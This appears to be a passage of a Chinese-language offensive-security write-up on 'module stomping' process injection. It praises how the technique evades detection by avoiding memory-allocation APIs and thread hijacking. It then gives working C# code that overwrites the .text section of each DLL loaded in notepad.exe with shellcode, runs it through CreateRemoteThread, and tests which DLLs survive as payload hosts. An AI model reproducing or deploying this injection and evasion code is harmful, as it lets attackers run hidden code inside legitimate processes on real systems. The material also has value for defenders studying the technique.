## 技术优点

```
1.  `不使用内存分配 API（例如，NtAllocateVirtualMemory、VirtualAllocEx 、NtMapViewOfSection ）`
    
2.  
    
3.  `线程在 DLL 的 .text 部分中执行，这对于在内存页面上具有可执行权限`
    
4.  
    
5.  `新创建线程的起始地址位于MEM_IMAGE内存区域，没有使用传统的线程劫持技术（严密监控！）`
    
```

## 目前的问题  

```
1.  `当 shellcode 被覆盖到现有的 DLL 内存页面时，进程会崩溃，因为该内存页面已被进程使用以使其工作，解决的方法是去寻找更大更棒，而且不会让你伤心，不会一闪而过不理你的DLL，具体方法`
    
```

```
1.  `static void Main(string[] args)`
    
2.  `{`
    
3.  `    string targetProcess = @"c:\Windows\System32\notepad.exe";`
    
4.  `    byte[] buf = new byte[] { //Sample MsgBox shellcode// };`
    
5.  `    STARTUPINFO si = new STARTUPINFO();`
    
6.  `    PROCESS_INFORMATION pi = new PROCESS_INFORMATION();`
    
7.  `    bool success = CreateProcess(targetProcess, null, IntPtr.Zero, IntPtr.Zero, false, ProcessCreationFlags.CREATE_NEW_CONSOLE, IntPtr.Zero, null, ref si, out pi);`
    
8.  `    Process processObj = Process.GetProcessById((int)pi.dwProcessId);`
    
9.  `    Thread.Sleep(2000); // Sleep to make sure all modules have been loaded by the process`
    
10.  `    Console.WriteLine("Total modules to be scanned: " + processObj.Modules.Count);`
     
11.  `    processObj.Kill();`
     
12.  `    Dictionary<string, bool> testDll = new Dictionary<string, bool>();`
     
13.  `    while (testDll.Count < processObj.Modules.Count) {`
     
14.  `        si = new STARTUPINFO();`
     
15.  `        pi = new PROCESS_INFORMATION();`
     
16.  `        CreateProcess(targetProcess, null, IntPtr.Zero, IntPtr.Zero, false, ProcessCreationFlags.CREATE_NEW_CONSOLE, IntPtr.Zero, null, ref si, out pi);`
     
17.  `        processObj = Process.GetProcessById((int)pi.dwProcessId);`
     
18.  `        Thread.Sleep(2000); // Sleep to make sure all modules have been loaded by the process`
     
19.  `        foreach (ProcessModule module in processObj.Modules) {`
     
20.  `            if (!testDll.ContainsKey(module.FileName)) {`
     
21.  `                IntPtr addr = (module.BaseAddress + 4096); // Get address of .text section`
     
22.  `                IntPtr outSize;`
     
23.  `                uint oldProtect;`
     
24.  `                VirtualProtectEx(processObj.Handle, addr, (UIntPtr)buf.Length, 0x04, out oldProtect);`
     
25.  `                WriteProcessMemory(processObj.Handle, addr, buf, buf.Length, out outSize);`
     
26.  `                VirtualProtectEx(processObj.Handle, addr, (UIntPtr)buf.Length, 0x20, out oldProtect);`
     
27.  `                IntPtr hThread = CreateRemoteThread(processObj.Handle, IntPtr.Zero, 0, addr, IntPtr.Zero, 0x0, out hThread);`
     
28.  `                Thread.Sleep(10000);`
     
29.  `                if (!Process.GetProcesses().Any(x => x.Id == pi.dwProcessId)) {`
     
30.  `                    testDll.Add(module.FileName, false);`
     
31.  `                    break;`
     
32.  `                } else {`
     
33.  `                    MEMORY_BASIC_INFORMATION64 mem_basic_info = new MEMORY_BASIC_INFORMATION64();`
     
34.  `                    VirtualQueryEx(pi.hProcess, addr, out mem_basic_info, (uint)Marshal.SizeOf(mem_basic_info));`
     
35.  `                    Console.WriteLine("Found valid candidate: " + module.FileName + ", region size available on the .text section: " + mem_basic_info.RegionSize);`
     
36.  `                    testDll.Add(module.FileName, true);`
     
37.  `                    processObj.Kill();`
     
38.  `                    break;`
     
39.  `                }`
     
40.  `            }`
     
41.  `        }`
     
42.  
     
43.  
     
44.  `    }`
     
45.  `}`
```
